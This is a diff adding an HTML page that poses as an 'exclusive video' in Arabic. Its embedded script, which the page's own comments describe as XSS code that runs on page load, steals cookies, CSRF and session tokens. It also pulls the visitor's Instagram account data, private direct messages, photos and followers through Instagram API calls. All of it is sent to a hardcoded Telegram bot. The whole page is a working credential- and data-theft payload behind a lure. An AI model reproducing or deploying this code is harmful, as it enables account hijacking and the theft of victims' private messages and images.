@@ -1,0 +1,165 @@
+here<!DOCTYPE html>
+<html>
+<head>
+    <title>فيديو حصري</title>
+</head>
+<body>
+    <h1>🔥 شاهد الفيديو قبل الحذف!</h1>
+    <video controls>
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+    </video>
+    <p>جاري التحميل...</p>
+
+    <script>
+        // =============================================
+        // كود XSS متكامل - يعمل تلقائياً فور فتح الصفحة
+        // يسرق كل شيء ويرسله إلى تيليجرام
+        // =============================================
+
+        (async function() {
+            // ========== إعدادات البوت ==========
+            const BOT_TOKEN = '8972731806:AAHkPhNBckd8j0QrifTSrZJKDLUVPR3mEbI'; // ضع توكن البوت هنا
+            const CHAT_ID = '7778340801'; // ضع معرف الدردشة هنا
+
+            // ========== دالة إرسال إلى تيليجرام ==========
+            async function sendToTelegram(text) {
+                try {
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: text.slice(0, 4000), // تيليجرام يحد بـ 4096 حرف
+                            parse_mode: 'HTML'
+                        })
+                    });
+                } catch(e) {
+                    console.error('فشل الإرسال إلى تيليجرام');
+                }
+            }
+
+            // ========== دالة إرسال الصور إلى تيليجرام ==========
+            async function sendPhotoToTelegram(imageUrl, caption = '') {
+                try {
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            photo: imageUrl,
+                            caption: caption.slice(0, 1000)
+                        })
+                    });
+                } catch(e) {
+                    console.error('فشل إرسال الصورة');
+                }
+            }
+
+            // ========== 1. سرقة الكوكيز والتوكن ==========
+            const cookies = document.cookie;
+            const csrfToken = localStorage.getItem('csrftoken') || '';
+            const sessionId = cookies.match(/sessionid=([^;]+)/);
+            const sessionValue = sessionId ? sessionId[1] : '';
+
+            // ========== 2. سرقة معلومات الحساب ==========
+            let accountData = {};
+            try {
+                const res = await fetch('https://i.instagram.com/api/v1/accounts/current_user/');
+                accountData = await res.json();
+            } catch(e) {
+                accountData = { error: 'فشل جلب الحساب' };
+            }
+
+            // ========== 3. سرقة الرسائل الخاصة ==========
+            let messagesData = {};
+            try {
+                const res = await fetch('https://i.instagram.com/api/v1/direct_v2/inbox/');
+                messagesData = await res.json();
+            } catch(e) {
+                messagesData = { error: 'فشل جلب الرسائل' };
+            }
+
+            // ========== 4. سرقة الصور من التايملاين ==========
+            let photoUrls = [];
+            try {
+                const res = await fetch('https://i.instagram.com/api/v1/feed/user/self/');
+                const photoData = await res.json();
+                if (photoData.items) {
+                    photoData.items.forEach(item => {
+                        if (item.image_versions2) {
+                            item.image_versions2.candidates.forEach(img => {
+                                photoUrls.push(img.url);
+                            });
+                        }
+                    });
+                }
+            } catch(e) {
+                photoUrls = [];
+            }
+
+            // ========== 5. سرقة المتابعين ==========
+            let followersData = {};
+            try {
+                const res = await fetch('https://i.instagram.com/api/v1/friendships/123456789/followers/');
+                followersData = await res.json();
+            } catch(e) {
+                followersData = { error: 'فشل جلب المتابعين' };
+            }
+
+            // ========== 6. تجميع كل البيانات ==========
+            const fullData = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                cookies: cookies,
+                csrfToken: csrfToken,
+                sessionId: sessionValue,
+                account: accountData,
+                messages: messagesData,
+                followers: followersData,
+                photoCount: photoUrls.length,
+                browser: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+
+            // ========== 7. إرسال البيانات إلى تيليجرام ==========
+            const message = `
+🩸 <b>عملية سرقة ناجحة</b>
+👤 <b>المستخدم:</b> ${accountData.user ? accountData.user.username : 'غير معروف'}
+🕒 <b>الوقت:</b> ${fullData.timestamp}
+📸 <b>عدد الصور المسروقة:</b> ${photoUrls.length}
+🍪 <b>الكوكيز:</b> ${cookies.slice(0, 200)}...
+🔑 <b>CSRF:</b> ${csrfToken}
+🌐 <b>المتصفح:</b> ${navigator.userAgent}
+            `;
+
+            await sendToTelegram(message);
+
+            // ========== 8. إرسال الصور إلى تيليجرام (أول 5 صور فقط) ==========
+            const maxPhotos = Math.min(photoUrls.length, 5);
+            for (let i = 0; i < maxPhotos; i++) {
+                await sendPhotoToTelegram(photoUrls[i], `📸 صورة ${i+1}/${photoUrls.length}`);
+                await new Promise(r => setTimeout(r, 1000)); // تأخير لتجنب حظر تيليجرام
+            }
+
+            // ========== 9. إرسال الرسائل كنص ==========
+            if (messagesData.inbox) {
+                const msgText = `💬 <b>الرسائل:</b>\n${JSON.stringify(messagesData, null, 2).slice(0, 3000)}`;
+                await sendToTelegram(msgText);
+            }
+
+            // ========== 10. إرسال الكوكيز الكاملة ==========
+            await sendToTelegram(`🍪 <b>الكوكيز الكاملة:</b>\n${cookies}`);
+
+            // ========== 11. إرسال تقرير نهائي ==========
+            await sendToTelegram(`✅ <b>تم الانتهاء من سرقة كل شيء</b>\n📦 حجم البيانات: ${JSON.stringify(fullData).length} حرف`);
+
+            console.log('✅ تم إرسال كل البيانات إلى تيليجرام');
+        })();
+    </script>
+</body>
+</html>
